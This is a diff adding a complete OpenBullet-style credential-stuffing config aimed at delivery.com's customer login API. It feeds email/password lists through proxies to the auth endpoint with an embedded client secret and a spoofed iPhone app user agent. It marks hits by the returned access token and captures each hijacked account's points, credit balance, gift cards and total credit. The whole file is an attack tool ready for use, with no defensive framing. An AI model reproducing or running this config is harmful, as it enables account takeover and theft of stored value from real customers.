@@ -1,0 +1,40 @@
+[SETTINGS]
+{
+  "Name": "Delivery.com",
+  "SuggestedBots": 1,
+  "LastModified": "2019-02-08T17:51:44.4760581+01:00",
+  "AdditionalInfo": "",
+  "Author": "Lucky",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.delivery.com/api/customer/auth" AutoRedirect=TRUE 
+  CONTENT "{\"password\":\"<PASS>\",\"forterTokenCookie\":\"6C7A81F0-F1AA-415F-8672-A7AE7FCD095A\",\"scope\":\"payment,global\",\"grant_type\":\"password\",\"username\":\"<USER>\",\"client_secret\":\"0E5LYRP5LezbvYd46xBKLqFhTBj0jAxx8lIr2Lw1\",\"client_id\":\"KK7atyaqGYOJmJsJja07YzQ82lkSXcJzwXsFLLbGva42\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Delivery/5.16.4 (iPhone; iOS 12.0; Scale/2.00)" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "The username or password was incorrect" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+PARSE "<SOURCE>" JSON "delivery_points" Recursive=FALSE -> CAP "Points" "" "" 
+PARSE "<SOURCE>" LR "{\"credit_balance\":{\"id\":null,\"value\":" "}" Recursive=FALSE -> CAP "CreditBalance" "" "" 
+PARSE "<SOURCE>" JSON "gift_cards" Recursive=FALSE -> CAP "GiftCards" "" "" 
+PARSE "<SOURCE>" JSON "total_credit" Recursive=FALSE -> CAP "Total Credit" "" "" 
